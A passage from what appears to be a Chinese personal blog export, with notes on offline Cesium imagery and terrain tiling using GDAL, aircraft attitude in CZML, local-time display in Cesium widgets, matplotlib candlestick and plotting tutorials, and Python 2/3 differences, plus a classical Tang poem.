    <content type="text"><![CDATA[最近研究在Cesium中调用自定义的图像和地形，不借助任何GIS系统（如Arcgis、天地图等），方便在网络不好或离线的情况下使用。下面对整个过程进行总结。 基础知识地图服务提供方法目前互联网地图服务商提供的地图服务分成两种[3]： 图像瓦片地图服务这种方法目前最常见，其提供的是图片格式的瓦片，在客户端将拼接成真正的地图。 矢量瓦片地图服务这种方法正在发展，其提供矢量的瓦片数据，然后在客户端进行渲染，是今后的发展方向。 地图服务在使用过程中需要获取特定经纬度所在区域的瓦片和获取瓦片上像素点对应的经纬度，因此需要进行经纬度坐标与瓦片坐标、像素坐标的相互转换。 经纬度与瓦片编号互换互联网地图的经纬度坐标与瓦片坐标相互转换只与该地图商的墨卡托投影和瓦片编号的定义有关，跟地图商采用的大地坐标系标准无关。 经纬度与瓦片像素互换转换方式与地图商采用的大地坐标系有关。国际标准的经纬度坐标是WGS84。Open Street Map、外国版的Google Map都是采用WGS84；高德地图使用的坐标系是GCJ-02；百度地图使用的坐标系是BD-09。 地图投影地图投影，是指按照一定的数学法则将地球椭球面上的经纬网转换到平面上，使地面的地理坐标与平面直角坐标建立起函数关系。这是绘制地图的数学基础之一。由于地球是一个不可展的球体，使用物理方法将其展平会引起褶皱、拉伸和断裂，因此要使用地图投影实现由曲面向平面的转化。 麦卡托投影法麦卡托投影法 (Mercator projection)，又称麦卡托投影法、正轴等角圆柱投影，是一种等角的圆柱形地图投影法。本投影法得名于法兰德斯出身的地理学家杰拉杜斯·麦卡托，他于1569年发表长202公分、宽124公分以此方式绘制的世界地图。在以此投影法绘制的地图上，经纬线于任何位置皆垂直相交，使世界地图可以绘制在一个长方形上。由于可显示任两点间的正确方位，航海用途的海图、航路图大都以此方式绘制。在该投影中线型比例尺在图中任意一点周围都保持不变，从而可以保持大陆轮廓投影后的角度和形状不变（即等角）；但麦卡托投影会使面积产生变形，极点的比例甚至达到了无穷大。 图1 墨卡托投影示意图 各大地图服务商大都采用了Web Mercator进行投影，瓦片坐标系的不同主要是投影截取的地球范围不同、瓦片坐标起点不同[3]。 ## 瓦片切割和瓦片坐标 对于经过墨卡托投影为平面的世界地图，在不同的地图分辨率(整个世界地图的像素大小)下，通过切割的方式将世界地图划分为像素为256px/256px的地图单元，划分成的每一块地图单元称为地图瓦片。其特定如下： * 具有唯一的瓦片等级（Level）和瓦片坐标编号（tileX, tileY）。 * 瓦片分辨率为256*256。 * 最小的地图等级是0，此时世界地图只由一张瓦片组成。 * 瓦片等级越高，组成世界地图的瓦片数越多，可以展示的地图越详细。 * 某一瓦片等级地图的瓦片是由低一级的各瓦片切割成的4个瓦片组成，形成了瓦片金字塔。 过程总结将自定义图像和地形以Web形式发布后，在cesium中调用自定义图像和地形很简单，代码如下，关键是图像和地形的获取和处理。 123456789101112131415var tmsImageryProvider=Cesium.createTileMapServiceImageryProvider(&#123; url:&apos;http://localhost:8080/test_tms_tiles&apos;&#125;);var terrainProvider=new Cesium.CesiumTerrainProvider(&#123; url:&apos;http://localhost:8080/terrain_tiles&apos;&#125;);var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;, &#123; imageryProvider : tmsImageryProvider, terrainProvider: terrainProvider, baseLayerPicker: false, geocoder: false, shadows: false, shouldAnimate: true&#125;) 卫星图像的获取和处理卫星图像获取可以使用一些相关软件，如水经注、LocaSpaceViewer、SXearth等。其原理通常是从一些地图服务商下载地图瓦片后重新拼接，再分割成对应格式的瓦片。拼接的图像最好输出为tif格式，因为tif格式可以在头部包含一些信息，例如地理坐标等信息，以方便后续的瓦片切割，以及被GIS系统直接识别导入。为使切割后的瓦片能够被Cesium直接调用，应采用标准TMS方式。 通常卫星图像下载软件提供多种瓦片分割方式，如果能直接进行标准TMS瓦片分割最好不过，如果不可以进行标准TMS分割，则可使用GDAL。 GDAL是地理空间数据抽象库的简称，是一个地理空间数据的格式转换及处理工具。文章最后将详细介绍其安装使用方法。使用GDAL进行卫星图像瓦片分割主要使用gdal2tiles.py工具。具体步骤如下： 选取之前下载拼接的最大分辨率的tif卫星图像 使用如下命令切割卫星图片,将自动生成瓦片金字塔。1gdal2tiles.py &lt;image&gt; &lt;tilesdir&gt; 卫星图像蓝边的处理卫星图像在浏览的过程中有可能会出现蓝边，其原因是瓦片下载过程中的边界没有处理好。解决思路是严格按照瓦片的经纬度设定边界。可通过google-maps-coordinates-tile-bounds-projection查询特定级别瓦片的各个顶点的经纬度。 地形的获取和处理Cesium支持多种地形provider来接收地形数据瓦片[8]： Cesium Terrain Server——高分辨率的全球地形数据，支持地形光照和水流效果。地形瓦片提交给客户端的数据的格式用的是quantized-mesh v1.0。 Esri ArcGIS Image Server——从Esri影像服务里的高度图中产生地形数据集。详情见Cesium里的ArcGisImageServerTerrainProvider. VR-TheWorld Server——从一个VR-TheWorld服务里的高度图中产生地形数据。它们的托管服务器有全球90米的数据，包括深度测量。 Ellipsoid——是Cesium默认的地形provider，是一个光滑的椭球面，没有现实的地形，地形高度为0。 常用的CesiumTerrainProvider支持两种格式的地形：一种是quantized-mesh格式的地形数据，另一种是基于高度图技术的DEM。前一种技术是Cesium独有不开放，因此将使用DEM数据在Cesium中渲染地形。 DEM数据是数字高程模型，是描述每个点位的高程数据，没有其他附加信息[9]。DEM数据在ArcGIS中打开只能看到是灰度图。通过相关软件可直接下载各大地图服务商的高程数据，但没有在Cesium中加载成功。下面介绍一种经过验证可在Cesium中成功加载地形的方法： 下载地形数据。可以从地理空间数据云下载地形数据。注册登录后，在首页选择“DEM 数字高程数据”，在选择“GDEMV2 30M 分辨率数字高程数据”。 合并地形数据。使用GDAL下的gdal_merge.py工具将下载的地形数据合并成一个Tif文件。 1gdal_merge.py -o out.tif input1.tif input2.tif 切割地形数据。使用牛人制作的gdal2srtmtiles.py脚本分割地形数据。编辑gdal2srtmtiles.py，在最后设置高程文件和输出目录。参考链接工具gdal2srtmtiles的安装使用。 发布地形服务。把terrain_tiles直接放到与 Cesium同端口的Tomcat或IIS站点。下（不能跨域），即可发布服务。 需要在Web Server中增加配置 .terrain文件的 Content-Type设为 application/octet-stream，同时拷贝“覆盖至生成tiles结果”目录中的 layer.json文件和0文件夹至生成结果目录下，比如我当前是 terrain_tiles目录下。 GDAL的安装使用GDAL(Geospatial Data Abstraction Library)是一个在X/MIT许可协议下的开源栅格空间数据转换库。该项目由Frank Warmerdam教授于1998年发起。 它利用抽象数据模型来表达所支持的各种文件格式。 它还有一系列命令行工具来进行数据转换和处理。 OGR(OpenGIS Simple Features Reference Implementation)是GDAL项目的一个子项目， 提供对矢量数据的支持。 一般把这两个库合称为GDAL/OGR，或者简称为GDAL。 GDAL安装方法之一GDAL不推荐从源码编译安装，建议从gisinternals下载gdal-203-1911-x64-core.msi、GDAL-2.3.0.win-amd64-py2.7.msi直接二进制安装。安装步骤如下： 安装python2.7。安装完成后配置环境变量，在path中添加 C:\Python27; 安装gdal-203-1911-x64-core.msi。安装完成后，设置环境变量GDAL_DATA，值为C:\Program Files\GDAL\gdal-data\，修改环境变量PATH，增加C:\Program Files\GDAL; pip install numpy。这是为了使用地形切割的脚本gdal2srtmtiles.py。 安装GDAL-2.3.0.win-amd64-py2.7.msi。 注意：当瓦片过多时，会报“OverflowError: range() result has too many items”的错误，而且python2已不再维护，因此不建议采用该方法安装GDAL。 GDAL安装方法之二OSGeo4W是用于开源GIS项目的Windows安装程序。 开源的本质意味着许多项目/程序相互依赖才能实现功能。 GDAL就是一个很好的例子。 几乎所有的开源GIS项目都在某种程度上使用GDAL来读写数据。 但是因为Windows是一个封闭的平台，所以它没有像基于Unix的操作系统那样开发软件包管理器。 因此，如果使用GRASS和QGIS的独立安装程序安装它们，则最终会进行2次GDAL安装。 添加3或4个以上的开源安装，最终您将获得十几个GDAL安装，此外还有一个仅用于GDAL的安装。 这就是OSGeo4W的用处。它可以跟踪开源GIS软件包的共享需求，因此QGIS和GRASS可以共享一次GDAL安装。 它还跟踪版本，因此您可以简单地升级程序。 从官网GDAL2Tiles Project找到 OSGeo4W 的下载链接，下载OSGeo4W并安装即可。 参考链接 Imagery-Layers-Tutorial, by cesiumjs Terrain-Tutorial, by cesiumjs 国内主要地图瓦片坐标系定义及计算原理, by CntChen 地图投影, by wikipedia Hexo博客搭建之在文章中插入图片, by Yan Yinhong 用ArcMap给遥感影像(tif格式)加入地理坐标，by wbz810. GDAL，by gdal Cesium之地形(1), by Super洛伽 Cesium中地形数据的加载，by CrazyGIS OpenLayers之多源数据加载二：瓦片地图原理,by giser. cesium加载离线tms切片,by nygfcn. TIFF,by wikipedia. Tile_Map_Service_Specification,by osgeo. TIFF图像文件格式详解(1),by xdyang. TIFF图像文件格式分析,by windcsn. 1. 地理数据处理软件包GDAL简介,by osgeo.cn. google-maps-coordinates-tile-bounds-projection,by maptiler. geopy,by theonegis. 工具gdal2srtmtiles的安装使用,by 四域公子.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium中飞行器姿态控制]]></title>
    <url>%2F2018%2F06%2F10%2FCesium%E4%B8%AD%E9%A3%9E%E8%A1%8C%E5%99%A8%E5%A7%BF%E6%80%81%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[问题提出最近研究开源虚拟地球Cesium，遇到一个问题：在获取飞行器经度纬度高度偏航俯仰滚转六个参数的前提下，如何在Cesium中用CZML文件表示，从而完美实现飞行器姿态轨迹的复现。在CZML的position属性中使用cartographicDegrees表示飞行器的经度纬度高度，可以很好复现飞行器的轨迹。然而在CZML的orientation属性中使用unitQuaternion表示飞机自身姿态时，飞机姿态总是不对。 问题分析基本知识在Cesium中存在两种常用坐标系： 世界坐标系世界坐标系统是以椭球中心为原点的笛卡尔空间直角坐标系。 地理坐标系地理坐标系即人们常用的使用经度、纬度、高度表示位置的坐标系。 站心坐标系又称为Earth-fixed coordinate system（站点坐标系、东-北-天坐标系ENU）。可分为站心直角坐标系和站心极坐标系。常用的站心直角坐标系定义为：以站心（如GPS接收天线中心）为坐标系原点O，Z轴与椭球法线重合，向上为正（天向），y与椭球短半轴重合（北向），x轴与地球椭球的长半轴重合（东向）所构成的直角坐标系，称为当地东北天坐标系（ENU）。飞行器的偏航、俯仰、滚转即是以站心直角坐标系为参考。 模型坐标系模型坐标系以物体的中心为坐标原点，物体旋转、平移等操作都是围绕局部坐标系进行的。这时当物体模型进行旋转、平移等操作时，局部坐标系也执行相应的旋转、平移等操作。局部坐标系是一个假想的坐标系，该坐标系与物体的相对位置至始至终是不变的，假想出这个坐标系的目的主要是为了正向理解对三维场景中物体执行的平移和旋转操作。使用局部坐标系理解模型变换时，所有的变换操作直接作用与局部坐标系，由于局部坐标系与物体的相对位置不变，因此对局部坐标系进行平移、旋转和缩放时，物体在场景中位置和形状也会发生相应的变化。 在Cesium中存在两种世界坐标系和地理坐标系之间坐标转换的方法：123456789# 经纬度转换为世界坐标Cesium.Cartesian3.fromDegrees(longitude, latitude, height, ellipsoid, result) # 世界坐标转换为经纬度var ellipsoid=viewer.scene.globe.ellipsoid;var cartesian3=new Cesium.cartesian3(x,y,z);var cartographic=ellipsoid.cartesianToCartographic(cartesian3);var lat=Cesium.Math.toDegrees(cartograhphic.latitude);var lng=Cesium.Math.toDegrees(cartograhpinc.longitude);var alt=cartographic.height; CZML分析CZML是一种用来描述动态场景的JSON架构的语言，主要用于Cesium在浏览器中的展示。它可以用来描述点、线、布告板、模型以及其他的图元，同时定义他们是怎样随时间变化的[3]。 CZML可使用model属性直接加载3D模型，由position属性决定模型在世界坐标系内的位置，由orientation决定模型在世界坐标系内的姿态，并最终由orientation的unitQuaternion表示。 unitQuaternion即单位四元数，可与偏航俯仰滚转相互转换，并避免偏航俯仰滚转的万向节锁定问题，但其本质上都是一个旋转矩阵，可决定模型在世界坐标系内的姿态。 获取正确的飞行器姿态首先计算飞行器模型坐标系对站点直角坐标系的旋转矩阵（在制作飞行器3D模型时，应使其中心在本地坐标系原点，机头机翼与轴平行，方便计算在站点直角坐标系内的旋转角度），再乘以由飞行器偏航俯仰滚转得到的旋转矩阵，再乘以站点直角坐标系对世界坐标系的旋转矩阵。将最终得到旋转矩阵转换为单位四元数，即得到正确的飞行器姿态。 小技巧：飞机3D模型的中心设置在本地坐标系原点，机头机翼与轴平行后，可能在Cesium中渲染时姿态还是不对。原因是绕Z轴旋转的角度还是不对。可以在HeadingPitchRoll示例中使用自己的飞机3D模型，参照Cesium给的运输机模型，比较它们之间绕Z轴旋转的差异，然后调整飞机3D模型绕Z轴旋转的角度。 解决方法参考代码如下：123456var lon=113,lat=34;//模型的站心经纬度var h1=0,p1=0,r1=0;//模型坐标系对站点坐标系的旋转角度var h2=0,p2=0,r2=0;//模型在站点坐标系的姿态var center = Cesium.Cartesian3.fromDegrees(lon, lat)var hpr = new Cesium.HeadingPitchRoll(h1+h2, p1+p2, r1+r2)var q1 = Cesium.Transforms.headingPitchRollQuaternion(center, hpr) 参考链接 CESIUM : How to animate an aircraft from pitch, roll, heading?, by stackoverflow. Cesium中的几种坐标和相互转换, by finalLi. Cesium Language (CZML) 入门1 — CZML Structure（CZML的结构）, by laixiangran. CZML Structure, by AnalyticalGraphicsInc. 3D坐标系, by S_H_C. 3D空间的坐标系, by trojanpizza.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[春江花月夜]]></title>
    <url>%2F2018%2F06%2F09%2F%E6%98%A5%E6%B1%9F%E8%8A%B1%E6%9C%88%E5%A4%9C%2F</url>
    <content type="text"><![CDATA[作者：张若虚 春江潮水连海平，海上明月共潮生。 滟滟随波千万里，何处春江无月明？ 江流宛转绕芳甸，月照花林皆似霰。 空里流霜不觉飞，汀上白沙看不见。 江天一色无纤尘，皎皎空中孤月轮。 江畔何人初见月，江月何年初照人？ 人生代代无穷已，江月年年祇相似。 不知江月待何人？但见长江送流水。 白云一片去悠悠，青枫浦上不胜愁。 谁家今夜扁舟子，何处相思明月楼？ 可怜楼上月徘徊，应照离人妆镜台。 玉户帘中卷不去，捣衣砧上拂还来。 此时相望不相闻，愿逐月华流照君。 鸿雁长飞光不度，鱼龙潜跃水成文。 昨夜闲潭梦落花，可怜春半不还家。 江水流春去欲尽，江潭落月复西斜。 斜月沉沉藏海雾，碣石潇湘无限路。 不知乘月几人归，落月摇情满江树。]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>唐诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium小部件animation和timeline的系统时间显示]]></title>
    <url>%2F2018%2F06%2F09%2FCesium%E5%B0%8F%E9%83%A8%E4%BB%B6animation%E5%92%8Ctimeline%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[Cesium的小部件animation和timeline显示UTC系统时间，需要将其改为本地系统时间。修改方法如下：12345678910111213141516171819202122232425this.viewer.animation.viewModel.dateFormatter = localeDateTimeFormatterthis.viewer.animation.viewModel.timeFormatter = localeTimeFormatterthis.viewer.timeline.makeLabel = function (time) &#123; return localeDateTimeFormatter(time) &#125;// Date formatting to a global formfunction localeDateTimeFormatter(datetime, viewModel, ignoredate) &#123; var julianDT = new Cesium.JulianDate(); Cesium.JulianDate.addHours(datetime,8,julianDT) var gregorianDT= Cesium.JulianDate.toGregorianDate(julianDT) var objDT; if (ignoredate) objDT = &apos;&apos;; else &#123; objDT = new Date(gregorianDT.year, gregorianDT.month - 1, gregorianDT.day); objDT = gregorianDT.year + &apos;年&apos; +objDT.toLocaleString(&quot;zh-cn&quot;, &#123; month: &quot;short&quot; &#125;)+ gregorianDT.day + &apos;日&apos; ; if (viewModel || gregorianDT.hour + gregorianDT.minute === 0) return objDT; objDT += &apos; &apos;; &#125; return objDT + Cesium.sprintf(&quot;%02d:%02d:%02d&quot;, gregorianDT.hour, gregorianDT.minute, gregorianDT.second);&#125;function localeTimeFormatter(time, viewModel) &#123; return localeDateTimeFormatter(time, viewModel, true);&#125; 上述代码还存在一个问题，当timeline小部件不活动时，其仍然显示UTC标准系统时间。 Cesium的credit十分碍眼，采用如下方法去掉： 12//去除版权信息viewer._cesiumWidget._creditContainer.style.display = &quot;none&quot;; 参考链接 EST，CST，PST，GMT，UTC，EDT等等时间缩写, by chienchia. Change UTC timezone to SGT timezone in Cesiumjs, by stackoverflow. Cesium去掉logo,by 跃然实验室.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Matplotlib蜡烛图绘制教程]]></title>
    <url>%2F2018%2F06%2F03%2FMatplotlib%E8%9C%A1%E7%83%9B%E5%9B%BE%E7%BB%98%E5%88%B6%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[股票分析离不开各种图表的绘制，尤其是最常用的蜡烛图。下面介绍python中使用matplotlib绘制蜡烛图的过程。 环境及配置使用的环境如下： 123456789101112$ python3 --versionPython 3.6.5rc1$ ipython3In [1]: import matplotlibIn [2]: matplotlib.__version__Out[2]: &apos;2.2.2&apos;In [3]: import tushare as tsIn [4]: ts.__version__Out[4]: &apos;1.1.9&apos;In [5]: import talibIn [6]: talib.__version__Out[6]: &apos;0.4.17&apos; 绘制蜡烛图通常使用matplotlib.finance库，但这个库在matplotlib 2.0后已经被废弃，并被移到一个名叫mpl_finance的库中。可使用如下命令安装mpl_finance。 1pip3 install https://github.com/matplotlib/mpl_finance/archive/master.zip mpl_finance使用雅虎接口获取股票数据，但是不稳定，因此推荐使用tushare库获取股票数据。另外使用talib计算股票各种技术分析指标，例如常用的均线数据。需要注意的是通过pip3按照的talib库是对C/C++版talib的包装，因此需先安装C/C++版talib。 蜡烛图绘制蜡烛图绘制函数简介mpl_finance库中蜡烛图的绘制主要有以下四个函数： 1234candlestick2_ochl(ax, opens, closes, highs, lows, width=4, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=0.75)candlestick2_ohlc(ax, opens, highs, lows, closes, width=4, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=0.75)candlestick_ochl(ax, quotes, width=0.2, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=1.0)candlestick_ohlc(ax, quotes, width=0.2, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=1.0) 在这四个函数的使用过程中需要注意的是： candlestick2_ohlc函数假定opens, highs, lows, closes中任意一个值不存在，则其他值也不存在。 candlestick_ochl和candlestick_ohlc的输入参数quotes是(time, open, close, high, low, …)元组序列，其中time必须是浮点日期格式，具体参见date2num。 蜡烛图绘制函数存在日线图的时间间隔问题（非交易日无法跳过，导致图像断裂）。常用解决方法是建议重新调整横坐标，被动地过滤掉非交易时间段[2]。例如： 12ax.set_xticks(range(0, len(data[&apos;date&apos;]), 10))ax.set_xticklabels(data[&apos;date&apos;][::10]) 蜡烛图的简单绘制蜡烛图的简单例子如下： 12345678910111213141516171819import numpy as npimport talibimport tushare as tsimport matplotlib.pyplot as pltimport mpl_finance as mpf data = ts.get_k_data(&apos;002320&apos;)sma_10 = talib.SMA(np.array(data[&apos;close&apos;]), 10)sma_30 = talib.SMA(np.array(data[&apos;close&apos;]), 30)fig = plt.figure(figsize=(24, 8))ax = fig.add_subplot(1, 1, 1)ax.set_xticks(range(0, len(data[&apos;date&apos;]), 50))ax.set_xticklabels(data[&apos;date&apos;][::50])ax.plot(sma_10, label=&apos;10 日均线&apos;)ax.plot(sma_30, label=&apos;30 日均线&apos;)ax.legend(loc=&apos;upper left&apos;)mpf.candlestick2_ochl(ax, data[&apos;open&apos;], data[&apos;close&apos;], data[&apos;high&apos;], data[&apos;low&apos;],width=0.5, colorup=&apos;r&apos;, colordown=&apos;green&apos;,alpha=0.6)plt.grid()plt.show() 参考链接 finance api, by matplotlib]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[matplotlib用法笔记]]></title>
    <url>%2F2018%2F05%2F26%2Fmatplotlib%E7%94%A8%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[matplotlib 是Python编程语言及其数值数学扩展包 NumPy的可视化操作界面。它为利用通用的图形用户界面工具包，如Tkinter, wxPython, Qt或GTK+向应用程序嵌入式绘图提供了应用程序接口（API）。此外，matplotlib还有一个基于图像处理库（如开放图形库OpenGL）的pylab接口，其设计与MATLAB非常类似—尽管并不怎么好用。SciPy就是用matplotlib进行图形绘制。 绘图结构matplotlib API包含有三层： backend_bases.FigureCanvas : 图表的绘制领域 backend_bases.Renderer : 知道如何在FigureCanvas上如何绘图 artist.Artist : 知道如何使用Renderer在FigureCanvas上绘图 FigureCanvas和Renderer需要处理底层的绘图操作，例如使用wxPython在界面上绘图，或者使用PostScript绘制PDF。Artist则处理所有的高层结构，例如处理图表、文字和曲线等的绘制和布局。通常我们只和Artist打交道，而不需要关心底层的绘制细节。 Artists分为简单类型和容器类型两种。简单类型的Artists为标准的绘图元件，例如Line2D、 Rectangle、 Text、AxesImage 等等。而容器类型则可以包含许多简单类型的Artists，使它们组织成一个整体，例如Axis、 Axes、Figure等。 图1 matplotlib pyplot绘图结构 基本用法使用plt.figure定义一个图像窗口。 1234567import matplotlib.pyplot as pltimport numpy as npx = np.linspace(-1, 1, 50)y = 2*x + 1plt.figure() plt.plot(x, y)plt.show() 设置标题12345678910111213141516# 导入matplotlib库import matplotlibimport matplotlib.pyplot as plt# %matplotlib inline 显示图表# 使用&apos;ggplot&apos;风格美化显示的图表plt.style.use(&apos;ggplot&apos;) # 设置使用的字体（需要显示中文的时候使用）font = &#123;&apos;family&apos;:&apos;SimHei&apos;&#125; matplotlib.rc(&apos;font&apos;,**font)# 当坐标轴有负号的时候可以显示负号matplotlib.rcParams[&apos;axes.unicode_minus&apos;]=False # 设置标题plt.title(&apos;正弦函数&apos;,fontsize=20) 设置子图表标题和标题字体的大小 设置坐标轴使用plt.xlim设置x坐标轴范围：(-1, 2)； 使用plt.ylim设置y坐标轴范围：(-2, 3)；使用plt.xlabel设置x坐标轴名称：’I am x’； 使用plt.ylabel设置y坐标轴名称：’I am y’； 1234plt.xlim((-1, 2))plt.ylim((-2, 3))plt.xlabel(&apos;I am x&apos;)plt.ylabel(&apos;I am y&apos;) 使用np.linspace定义范围以及个数：范围是(-1,2);个数是5. 使用print打印出新定义的范围. 使用plt.xticks设置x轴刻度：范围是(-1,2);个数是5. 123new_ticks = np.linspace(-1, 2, 5)print(new_ticks)plt.xticks(new_ticks) 使用plt.yticks设置y轴刻度以及名称：刻度为[-2, -1.8, -1, 1.22, 3]；对应刻度的名称为[‘really bad’,’bad’,’normal’,’good’, ‘really good’]. 使用plt.show显示图像. 12plt.yticks([-2, -1.8, -1, 1.22, 3],[r&apos;$really\ bad$&apos;, r&apos;$bad$&apos;, r&apos;$normal$&apos;, r&apos;$good$&apos;, r&apos;$really\ good$&apos;])plt.show() 使用plt.gca获取当前坐标轴信息. 使用.spines设置边框：右侧边框；使用.set_color设置边框颜色：默认白色； 使用.spines设置边框：上边框；使用.set_color设置边框颜色：默认白色； 1234ax = plt.gca()ax.spines[&apos;right&apos;].set_color(&apos;none&apos;)ax.spines[&apos;top&apos;].set_color(&apos;none&apos;)plt.show() 调整坐标轴使用.xaxis.set_ticks_position设置x坐标刻度数字或名称的位置：bottom.（所有位置：top，bottom，both，default，none） 1ax.xaxis.set_ticks_position(&apos;bottom&apos;) 使用.spines设置边框：x轴；使用.set_position设置边框位置：y=0的位置；（位置所有属性：outward，axes，data）使用.yaxis.set_ticks_position设置y坐标刻度数字或名称的位置：left.（所有位置：left，right，both，default，none）使用.spines设置边框：y轴；使用.set_position设置边框位置：x=0的位置；（位置所有属性：outward，axes，data） 使用plt.show显示图像. 1234ax.spines[&apos;bottom&apos;].set_position((&apos;data&apos;, 0))ax.yaxis.set_ticks_position(&apos;left&apos;)ax.spines[&apos;left&apos;].set_position((&apos;data&apos;,0))plt.show() legend图例基本用法123456789101112131415161718192021222324import matplotlib.pyplot as pltimport numpy as npx = np.linspace(-3, 3, 50)y1 = 2*x + 1y2 = x**2plt.figure()#set x limitsplt.xlim((-1, 2))plt.ylim((-2, 3))# set new sticksnew_sticks = np.linspace(-1, 2, 5)plt.xticks(new_sticks)# set tick labelsplt.yticks([-2, -1.8, -1, 1.22, 3], [r&apos;$really\ bad$&apos;, r&apos;$bad$&apos;, r&apos;$normal$&apos;, r&apos;$good$&apos;, r&apos;$really\ good$&apos;])# set line sylesl1, = plt.plot(x, y1, label=&apos;linear line&apos;)l2, = plt.plot(x, y2, color=&apos;red&apos;, linewidth=1.0, linestyle=&apos;--&apos;, label=&apos;square line&apos;)plt.legend(loc=&apos;upper right&apos;) 调整位置和名称1plt.legend(handles=[l1, l2], labels=[&apos;up&apos;, &apos;down&apos;], loc=&apos;best&apos;) 其中’loc’参数有多种，’best’表示自动分配最佳位置。 1234567891011&apos;best&apos; : 0, &apos;upper right&apos; : 1,&apos;upper left&apos; : 2,&apos;lower left&apos; : 3,&apos;lower right&apos; : 4,&apos;right&apos; : 5,&apos;center left&apos; : 6,&apos;center right&apos; : 7,&apos;lower center&apos; : 8,&apos;upper center&apos; : 9,&apos;center&apos; : 10, 子图使用plt.subplot来创建小图。 plt.subplot(2,2,1)表示将整个图像窗口分为2行2列, 当前位置为1。 使用plt.plot([0,1],[0,1])在第1个位置创建一个小图。 1234import matplotlib.pyplot as pltfig=plt.figure()ax = fig.add_subplot(2, 2, 1, projection=&apos;3d&apos;)ax.plot([0,1,1],[0,1,1]) plt.subplot(222)表示将整个图像窗口分为2行2列, 当前位置为2. 使用plt.plot([0,1],[0,2])在第2个位置创建一个小图. 12plt.subplot(222)plt.plot([0,1],[0,2]) 动画Matplotlib使用FuncAnimation函数生成动画。参数说明： fig 进行动画绘制的figure func 自定义动画函数，即传入刚定义的函数animate frames 动画长度，一次循环包含的帧数 init_func 自定义开始帧，即传入刚定义的函数init interval 更新频率，以ms计 blit 选择更新所有点，还是仅更新产生变化的点。应选择True，但mac用户请选择False，否则无法显示动画 12345678910111213141516171819202122232425from matplotlib import pyplot as pltfrom matplotlib import animationimport numpy as npfig, ax = plt.subplots()x = np.arange(0, 2*np.pi, 0.01)line, = ax.plot(x, np.sin(x))def animate(i): line.set_ydata(np.sin(x + i/10.0)) return line,def init(): line.set_ydata(np.sin(x)) return line,//注意此处FuncAnimation必须有返回值ani = animation.FuncAnimation(fig=fig, func=animate, frames=100, init_func=init, interval=20, blit=False)plt.show() 参考链接 matplotlib, by wikipedia 莫烦Python, by morvanzhou API Overview,by matplotlib. Python matplotlib高级绘图详解,by 微岩. 用Matplotlib制作动画,by 段丞博. Plot inline or a separate window using Matplotlib in Spyder IDE,by stackoverflow. Python之matplotlib的使用汇总,by 探索数据之美.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3与python2的区别与兼容]]></title>
    <url>%2F2018%2F05%2F26%2Fpython3%E4%B8%8Epython2%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%85%BC%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[Python是一种广泛使用的高级编程语言，属于通用型编程语言，由吉多·范罗苏姆创造，第一版发布于1991年。可以视之为一种改良（加入一些其他编程语言的优点，如面向对象）的LISP。作为一种解释型语言，Python的设计哲学强调代码的可读性和简洁的语法（尤其是使用空格缩进划分代码块，而非使用大括号或者关键词）。相比于C++或Java，Python让开发者能够用更少的代码表达想法。不管是小型还是大型程序，该语言都试图让程序的结构清晰明了。 与Scheme、Ruby、Perl、Tcl等动态类型编程语言一样，Python拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且支持多种编程范式，包括面向对象、命令式、函数式和过程式编程。其本身拥有一个巨大而广泛的标准库。 Python 解释器本身几乎可以在所有的操作系统中运行。Python的正式解释器CPython是用C语言编写的、是一个由社区驱动的自由软件，目前由Python软件基金会管理。 python3与python2区别print函数Python 2 的 print 声明在Python 3中已经被 print() 函数取代12345#!/usr/bin/python2print &apos;Hello, World!&apos;#!/usr/bin/python3print(&apos;Hello, World!&apos;) 整除/是精确除法，//是向下取整除法，%是求模。 //和%运算符在2和3版本中一样，但是运算符/不一样。12345678910111213141516171819#!/usr/bin/python2&gt;&gt;&gt; 3 / 21&gt;&gt;&gt; 3 // 21&gt;&gt;&gt; 3 / 2.01.5&gt;&gt;&gt; 3 // 2.01.0#!/usr/bin/python3&gt;&gt;&gt; 3 / 21.5&gt;&gt;&gt; 3 // 21&gt;&gt;&gt; 3 / 2.01.5&gt;&gt;&gt; 3 // 2.01.0 Unicode由于历史遗留问题，Python 2.x版本虽然支持Unicode，但在语法上需要’xxx’和u’xxx’两种字符串表示方式。 在Python 3.x版本中，把’xxx’和u’xxx’统一成Unicode编码，即写不写前缀u都是一样的，而以字节形式表示的字符串则必须加上b前缀：b’xxx’。123456#!/usr/bin/python2#!/usr/bin/python3&gt;&gt;&gt; 中国 = &apos;china&apos; &gt;&gt;&gt; print(中国)china xrange模块在 Python 2 中 xrange() 创建迭代对象的用法是非常流行的。比如： for 循环或者是列表/集合/字典推导式。 在 Python 3 中，range() 是像 xrange() 那样实现以至于一个专门的 xrange() 函数都不再存在（在 Python 3 中 xrange() 会抛出命名异常）。 不等运算符Python 2.x中不等于有两种写法 != 和 &lt;&gt; Python 3.x中去掉了&lt;&gt;, 只有!=一种写法 数据类型 Py3.X去除了long类型，现在只有一种整型——int，但它的行为就像2.X版本的long 新增了bytes类型，对应于2.X版本的八位串 dict的.keys()、.items 和.values()方法返回迭代器，而之前的iterkeys()等函数都被废弃。同时去掉的还有 